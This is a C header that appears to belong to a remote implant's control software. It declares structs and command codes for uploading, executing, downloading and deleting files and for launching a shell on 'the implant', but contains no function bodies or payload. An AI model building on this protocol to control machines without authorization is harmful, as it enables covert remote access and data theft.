#ifndef _CLIENT_SESSION_H
#define _CLIENT_SESSION_H
#include "debug.h"
#include "polarssl/ssl.h"
#include "crypto.h"

#include "compat.h"
#include "function_strings.h"

#define DATA_BUFFER_SIZE	4096
#define	CONNECT_TIMEOUT	60 * 5 //connect timeout = 60 seconds * 5 minutes
#define SESSION_TIMEOUT 60 * 60 * 1		// session timeout = 60 seconds * 60 minutes * 1 hours
// for testing
//#define SESSION_TIMEOUT 30


/*!
 * @struct COMMAND
 * @brief 
 * The command struct holds information about the command being sent
 * to the implant
 *
 * @var command - Contains the name of the command being sent
 * @var path - Contains the path to a file if the command needs it
 * @var size - Size of the file it one is being uploaded or downloaded
 * @var padding - ?
 */

typedef struct _COMMAND {
	unsigned char	command;
	char	        path[255];
	unsigned long	size;
	unsigned long	padding;
} COMMAND;

/*!
 * @struct REPLY
 * @brief 
 * The reply struct holds the reply information to confirm that a 
 * command succeeded
 *
 * @var reply - Contains the reply data
 * @var padding - ?
 */

typedef struct _REPLY {
	unsigned long	reply;
	unsigned long	padding;
} REPLY;

/*!
 * @struct DATA
 * @brief 
 * The data struct holds a seris of characters sent or recieved in a packet
 *
 * @var data - holds data from a packet
 */

typedef struct _DATA {
	unsigned char	data[DATA_BUFFER_SIZE];
} DATA;

/* FOLLOWING DEFINITIONS FOR EXIT THROUGH HELP ARE ALSO IN servers Shell.h file */
#define UPLOAD            1     /* command = ul for upload */
#define EXECUTE           2     /* command = exec for execute */
#define UPLOADEXECUTE     3     /* not implemented att */
#define DOWNLOAD          4     /* command = dl for download */
#define DELETE            5     /* command = del for delete */
#define SHUTDOWNBOTH	  6		/* command = shut for shutdown, compat.h defines SHUTDOWN as 2 for sockets */
#define HELP              7     /* command = help */
#define LAUNCHTRUESHELL   8
#define EXIT              10    /* command = ex for exit */

unsigned long StartClientSession( int sock );

#endif

